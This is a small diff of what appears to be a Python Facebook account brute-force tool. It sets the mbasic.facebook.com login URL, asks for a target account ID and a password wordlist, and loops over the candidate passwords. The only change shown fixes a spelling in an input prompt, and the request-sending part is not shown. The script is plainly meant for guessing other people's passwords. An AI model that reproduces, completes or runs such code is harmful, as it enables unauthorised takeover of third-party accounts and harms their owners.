@@ -15,7 +15,7 @@ os.system('figlet LITBE')
 url ='https://mbasic.facebook.com/login.php'
 
 akun = raw_input("enter your id target : ")
-list = raw_input("enter your worldlist : ")
+list = raw_input("enter your wordlist : ")
 x = open(list,'r').readlines()
 for line in x:
   password = line.strip()
